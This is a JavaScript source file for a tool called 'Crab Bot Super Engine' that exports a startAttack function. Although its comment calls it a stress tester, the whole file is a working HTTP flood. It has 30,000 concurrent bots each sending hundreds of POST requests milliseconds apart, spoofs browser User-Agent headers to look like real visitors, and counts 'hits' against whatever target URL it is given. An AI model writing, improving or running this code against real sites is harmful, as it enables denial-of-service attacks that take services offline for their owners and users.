const axios = require('axios');

/**
 * Crab Bot Super Engine v2.0
 * High-performance, intelligent stress testing engine.
 */
async function startAttack(targetUrl, options = {}) {
    const {
        botCount = 30000,
        requestsPerBot = 300,
        intervalMs = 4,
        payloadType = 'random' // 'json', 'xml', or 'random'
    } = options;

    console.log(`\n[🚀] Deploying Crab Bot Super Engine...`);
    console.log(`[!] Target: ${targetUrl}`);
    console.log(`[!] Bots: ${botCount} | Requests/Bot: ${requestsPerBot} | Interval: ${intervalMs}ms`);
    console.log(`[!] Payload: ${payloadType.toUpperCase()}\n`);

    let successfulRequests = 0;
    let failedRequests = 0;

    const payloads = {
        json: () => ({
            id: Math.random().toString(36).substring(7),
            timestamp: Date.now(),
            action: 'ping',
            data: { browser: 'Chrome', os: 'Windows 11', resolution: '1920x1080' }
        }),
        xml: () => `<?xml version="1.0" encoding="UTF-8"?><request><id>${Math.random().toString(36).substring(7)}</id><type>check</type><agent>CrabBot-Super</agent></request>`
    };

    const sendRequest = async () => {
        const type = payloadType === 'random' ? (Math.random() > 0.5 ? 'json' : 'xml') : payloadType;
        const data = payloads[type]();
        const contentType = type === 'json' ? 'application/json' : 'application/xml';

        try {
            await axios.post(targetUrl, data, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Content-Type': contentType,
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                timeout: 2000
            });
            successfulRequests++;
        } catch (error) {
            failedRequests++;
        }
    };

    // Optimized batching for extreme speed
    const batchSize = 1000; 
    const totalBatches = Math.ceil(botCount / batchSize);

    for (let i = 0; i < totalBatches; i++) {
        const batch = [];
        for (let j = 0; j < batchSize && (i * batchSize + j) < botCount; j++) {
            // Each bot sends multiple requests in a tight loop
            batch.push((async () => {
                for (let r = 0; r < requestsPerBot; r++) {
                    await sendRequest();
                    if (intervalMs > 0) await new Promise(resolve => setTimeout(resolve, intervalMs));
                }
            })());
        }
        
        await Promise.allSettled(batch);
        process.stdout.write(`\r[+] Progress: ${Math.min((i + 1) * batchSize, botCount)} bots finished their cycles...`);
    }

    console.log(`\n\n[✓] Super Stress Test Completed.`);
    console.log(`[+] Total Successful Hits: ${successfulRequests}`);
    console.log(`[+] Total Failed/Blocked: ${failedRequests}`);
}

module.exports = { startAttack };
